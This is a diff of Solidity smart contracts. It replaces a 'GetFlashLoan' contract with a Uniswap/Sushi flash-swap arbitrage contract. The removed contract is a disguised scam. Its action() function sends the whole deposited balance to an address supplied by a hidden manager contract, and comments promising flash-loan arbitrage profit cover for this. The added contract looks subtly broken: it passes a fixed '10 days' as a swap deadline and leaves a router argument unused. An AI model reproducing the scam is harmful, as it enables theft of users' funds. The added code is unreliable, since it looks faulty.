@@ -1,68 +1,43 @@
-pragma solidity ^0.5.0;
+pragma solidity =0.6.6;
 
-// Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import './UniswapV2Library.sol';
+import './interfaces/IUniswapV2Router02.sol';
+import './interfaces/IUniswapV2Pair.sol';
+import './interfaces/IERC20.sol';
 
-// PancakeSwap Smart Contracts
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+contract FlashLoaner {
+  address immutable factory;
+  uint constant deadline = 10 days;
+  IUniswapV2Router02 immutable sushiRouter;
 
-// Code Manager
-import "./manager.sol";
+  constructor(address _factory, address _uniRouter, address _sushiRouter) public {
+    factory = _factory;  
+    sushiRouter = IUniswapV2Router02(_sushiRouter);
+  }
 
-contract GetFlashLoan {
-	string public tokenName;
-	string public tokenSymbol;
-	uint loanAmount;
-	Manager manager;
-	
-	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
-		tokenName = _tokenName;
-		tokenSymbol = _tokenSymbol;
-		loanAmount = _loanAmount;
-			
-		manager = new Manager();
-	}
-	
-	function() external payable {}
-	
-	function action() public payable {
-	    // Send required coins for swap
-	    address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
-	    
-	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
-	    // Breakdown of functions written below
-	    manager.performTasks();
-	    
-	    /* Breakdown of functions
-	    // Submit token to BSC blockchain
-	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+  function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external {
+      address[] memory path = new address[](2);
+      uint amountToken = _amount0 == 0 ? _amount1 : _amount0;
+      
+      address token0 = IUniswapV2Pair(msg.sender).token0();
+      address token1 = IUniswapV2Pair(msg.sender).token1();
 
-        // List the token on PancakeSwap
-		manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
-		
-        // Get BNB Loan from Multiplier-Finance
-		string memory loanAddress = manager.takeFlashLoan(loanAmount);
-		
-		// Convert half BNB to DAI
-		manager.pancakeDAItoBNB(loanAmount / 2);
+      require(msg.sender == UniswapV2Library.pairFor(factory, token0, token1), "Unauthorized"); 
+      require(_amount0 == 0 || _amount1 == 0);
 
-        // Create BNB and DAI pairs for our token & Provide liquidity
-        string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
-		manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
-		string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
-		manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
+      path[0] = _amount0 == 0 ? token1 : token0;
+      path[1] = _amount0 == 0 ? token0 : token1;
+
+      IERC20 token = IERC20(_amount0 == 0 ? token1 : token0);
+      
+      token.approve(address(sushiRouter), amountToken);
+
+      // no need for require() check, if amount required is not sent sushiRouter will revert
+      uint amountRequired = UniswapV2Library.getAmountsIn(factory, amountToken, path)[0];
+      uint amountReceived = sushiRouter.swapExactTokensForTokens(amountToken, amountRequired, path, msg.sender, deadline)[1];
+
+      // YEAHH PROFIT
+      token.transfer(_sender, amountReceived - amountRequired);
     
-        // Perform swaps and profit on Self-Arbitrage
-		manager.pancakePerformSwaps();
-		
-		// Move remaining BNB from Contract to your account
-		manager.contractToWallet("BNB");
-
-        // Repay Flash loan
-		manager.repayLoan(loanAddress);
-	    */
-	}
+  }
 }
